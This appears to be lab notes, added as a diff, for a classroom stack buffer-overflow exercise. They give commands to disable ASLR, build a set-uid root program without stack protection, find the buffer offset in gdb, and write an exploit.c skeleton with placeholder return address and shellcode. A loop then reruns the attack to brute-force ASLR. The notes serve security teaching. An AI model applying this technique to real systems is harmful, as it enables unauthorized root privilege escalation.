@@ -1,0 +1,91 @@
+##############################################################
+#################### Lab Environment  ########################
+##############################################################
+
+1) Turn off address randomization
+----------------------------------
+
+	sudo sysctl -w kernel.randomize_va_space=0
+
+2) Compile set-uid root stack.c
+----------------------------------
+
+    gcc -o stack -z execstack -fno-stack-protector stack.c
+	sudo chown root stack	
+	sudo chmod 4755 stack
+
+##############################################################
+################## Calculate the Distance ####################
+##############################################################
+
+1) Compile debug version stack.c
+-----------------------------------
+
+	gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c
+
+2) Start debugging
+---------------------
+
+	touch badfile
+	gdb stack_dbg
+
+3) GDB commands
+---------------------
+   
+        b bof
+        run
+        p &buffer
+        p $ebp  
+        p 0x02 - 0x01		
+        quit     
+
+
+##############################################################
+################## Generate badfile  #########################
+##############################################################		
+		 
+1) Add the following to exploit.c
+--------------------------------------
+
+    // Set the value for the return address
+    *((long *) (buffer + <Task A>)) = <Task B>;
+
+    // Place the shellcode towards the end of buffer
+    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));
+
+2) Compile exploit.c
+-------------------------
+
+	gcc exploit.c -o exploit
+
+	
+##############################################################
+################ Defeat Countermeasure########################
+##############################################################	
+
+1) Turn the countermeasure on	
+-----------------------------------
+
+   sudo sysctl -w kernel.randomize_va_space=2
+
+2) Compile set-uid root version of stack.c
+---------------------------------------------
+
+   gcc -o stack -z execstack -fno-stack-protector stack.c
+   sudo chown root stack
+   sudo chmod 4755 stack
+
+3) Run the attack in a loop, until it succeeds
+------------------------------------------------
+#!/bin/bash
+
+SECONDS=0
+value=0
+while [ 1 ]
+  do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  echo "$(($duration / 60)) minutes and $(($duration %60)) seconds elapsed."
+  echo "The program has been running for $value times."
+  ./stack
+done
